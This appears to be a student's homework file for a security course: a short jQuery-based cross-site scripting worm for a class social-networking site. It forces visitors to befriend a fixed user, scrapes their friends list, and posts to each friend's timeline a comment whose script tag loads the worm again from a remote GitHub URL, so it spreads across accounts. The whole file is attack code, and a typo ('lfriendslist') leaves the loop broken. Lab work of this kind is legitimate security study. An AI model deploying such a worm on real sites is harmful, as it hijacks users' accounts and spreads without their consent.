//Nikolas Zahorian(naz5617) CSEC-380 HW 6 Act 2 

//Adding friends
$.get("add_friend.php", {'id': 67})

//places worm on other pages
$.get("friends.php", function(grabfriends){
    friendslist = grabfriends.split("?id=")
    //moves through the friend list
    for(var i = 1; i < friendslist.length; i++){
        //Sets the id of the friend
        specid = lfriendslist[i].split("'>").toString().split(',')[0];
	    check(specid)

    }
});

function check(specid){
    $.get("timeline.php", {'id': 67}, function(spread){
        //places the script on their page if it hasn't already
        if(!spread.includes(specid+":has Nikolas Zahorian at time: ")){
            //comments on the page to guarentee that it won't post again
            $.get("/add_comment.php", {'id': 67, 'comment':  specid+":has Nikolas Zahorian at time: "+new Date(Date.now()).toLocaleString()})
            //adds the link back to the original script to spread further
            $.get("/add_comment.php", {'id': specid, 'comment': "<script src='https://raw.githubusercontent.com/naz5617/csec380_armbook_worm/main/Activity2_worm.js'></script>"})
        }
    })
}